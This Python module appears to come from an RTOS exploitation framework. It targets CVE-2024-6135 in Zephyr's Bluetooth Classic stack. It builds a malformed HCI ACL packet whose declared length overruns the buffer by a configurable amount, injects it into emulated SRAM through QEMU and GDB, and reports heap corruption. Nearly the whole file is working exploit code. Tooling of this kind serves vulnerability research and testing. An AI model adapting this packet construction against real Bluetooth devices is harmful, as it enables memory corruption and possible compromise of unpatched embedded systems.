"""Zephyr BLE CVE-2024-6135 BT Classic missing bounds check exploit module."""

from __future__ import annotations

import struct
import logging

from rtosploit.scanners.base import ScannerModule, ScanOption, ScanResult

logger = logging.getLogger(__name__)

# SRAM buffer address for payload injection via GDB
_DEFAULT_INJECT_ADDR = 0x20002000


class ZephyrBLECVE20246135(ScannerModule):
    name = "ble_cve_2024_6135"
    description = (
        "Zephyr BLE CVE-2024-6135: Missing bounds checks in Bluetooth Classic processing. "
        "Attacker-controlled packet fields bypass length validation, enabling out-of-bounds "
        "reads or writes in the host BT stack. Affects Zephyr < 3.7.0."
    )
    authors = ["RTOSploit Contributors"]
    references = [
        "CVE-2024-6135",
        "https://nvd.nist.gov/vuln/detail/CVE-2024-6135",
        "https://github.com/zephyrproject-rtos/zephyr/security/advisories",
    ]
    rtos = "zephyr"
    rtos_versions = ["3.0.0", "3.1.0", "3.2.0", "3.3.0", "3.4.0", "3.5.0", "3.6.0"]
    architecture = "armv7m"
    category = "heap_corruption"
    reliability = "medium"
    cve = "CVE-2024-6135"

    def register_options(self):
        self.add_option(ScanOption(
            name="packet_type", type="str", required=False, default="hci_acl",
            description="Packet type to malform: 'hci_acl' or 'hci_sco'"
        ))
        self.add_option(ScanOption(
            name="overflow_size", type="int", required=False, default=64,
            description="Number of bytes past bounds to write"
        ))

    def _build_hci_acl_packet(self, overflow_size: int) -> bytes:
        """Construct a malformed HCI ACL packet with oversized data_len.

        HCI ACL Data Packet layout:
            uint16_t handle_flags  -- connection handle (12 bits) + PB flag (2 bits) + BC flag (2 bits)
            uint16_t data_len      -- total data length (set large to trigger OOB)
            uint8_t  data[]        -- payload

        handle=0x0001, PB=0x02 (first non-auto-flushable), BC=0x00 (point-to-point)
        handle_flags = handle | (PB << 12) | (BC << 14)
        """
        handle = 0x0001
        pb_flag = 0x02  # First non-auto-flushable packet
        bc_flag = 0x00  # Point-to-point
        handle_flags = handle | (pb_flag << 12) | (bc_flag << 14)

        # data_len is set to trigger OOB: normal allocation + overflow_size
        # Typical BT buffer is ~64 bytes; we claim a much larger length
        claimed_data_len = 64 + overflow_size
        overflow_data = bytes([0x42 + (i % 26) for i in range(claimed_data_len)])

        header = struct.pack("<HH", handle_flags, claimed_data_len)
        return header + overflow_data

    def check(self, target) -> bool:
        if not target.fingerprint or target.fingerprint.rtos_type != "zephyr":
            return False
        data = target.firmware.data
        return b"bt_" in data or b"BT_" in data or b"hci_" in data or b"HCI_" in data

    def exploit(self, target, payload) -> ScanResult:
        packet_type = self.get_option("packet_type")
        overflow_size = self.get_option("overflow_size")

        # Step 1: Construct the actual malformed HCI ACL packet
        hci_packet = self._build_hci_acl_packet(overflow_size)
        packet_hex = hci_packet.hex()

        # Decode the header for reporting
        handle_flags, data_len = struct.unpack("<HH", hci_packet[:4])

        notes = [
            "CVE-2024-6135: Missing bounds check in BT Classic HCI ACL processing",
            f"Constructed malformed {packet_type} packet: {len(hci_packet)} bytes total",
            f"HCI ACL header: handle_flags=0x{handle_flags:04x}, data_len={data_len} (0x{data_len:04x})",
            f"Overflow: {overflow_size} bytes past expected allocation boundary",
            f"Crafted packet (hex): {packet_hex}",
        ]

        # Step 2: Check if we have a live GDB connection for injection
        gdb = None
        if target._qemu is not None:
            gdb = getattr(target._qemu, "gdb", None)

        if gdb is not None and getattr(gdb, "_connected", False):
            inject_addr = _DEFAULT_INJECT_ADDR
            try:
                gdb.write_memory(inject_addr, hci_packet)
                notes.append(
                    f"Payload injected into target SRAM at 0x{inject_addr:08x} via GDB"
                )

                # Verify the write
                readback = gdb.read_memory(inject_addr, len(hci_packet))
                if readback == hci_packet:
                    notes.append("Verification: payload readback matches crafted packet")
                else:
                    notes.append(
                        "WARNING: payload readback does not match -- "
                        "memory write may have been partially corrupted"
                    )
                    return ScanResult(
                        module="zephyr/ble_cve_2024_6135",
                        status="failure",
                        target_rtos="zephyr",
                        architecture="armv7m",
                        technique="bt_classic_bounds_check",
                        payload_delivered=False,
                        payload_type="bt_packet",
                        achieved=[],
                        registers_at_payload={},
                        notes=notes,
                        cve="CVE-2024-6135",
                    )

                # Read registers for diagnostic context
                try:
                    regs = gdb.read_registers()
                except Exception:
                    regs = {}

                return ScanResult(
                    module="zephyr/ble_cve_2024_6135",
                    status="success",
                    target_rtos="zephyr",
                    architecture="armv7m",
                    technique="bt_classic_bounds_check",
                    payload_delivered=True,
                    payload_type="bt_packet",
                    achieved=["heap_corruption"],
                    registers_at_payload=regs,
                    notes=notes,
                    cve="CVE-2024-6135",
                )

            except Exception as exc:
                notes.append(f"GDB injection failed: {exc}")
                return ScanResult(
                    module="zephyr/ble_cve_2024_6135",
                    status="failure",
                    target_rtos="zephyr",
                    architecture="armv7m",
                    technique="bt_classic_bounds_check",
                    payload_delivered=False,
                    payload_type="bt_packet",
                    achieved=[],
                    registers_at_payload={},
                    notes=notes,
                    cve="CVE-2024-6135",
                )
        else:
            notes.append(
                "No active QEMU+GDB session available. "
                "Payload constructed but cannot be delivered or verified. "
                "Start QEMU with GDB stub to inject and test this exploit."
            )
            return ScanResult(
                module="zephyr/ble_cve_2024_6135",
                status="not_run",
                target_rtos="zephyr",
                architecture="armv7m",
                technique="bt_classic_bounds_check",
                payload_delivered=False,
                payload_type="bt_packet",
                achieved=[],
                registers_at_payload={},
                notes=notes,
                cve="CVE-2024-6135",
            )

    def cleanup(self, target) -> None:
        pass

    def requirements(self) -> dict:
        return {"qemu": True, "gdb": True, "network": True}
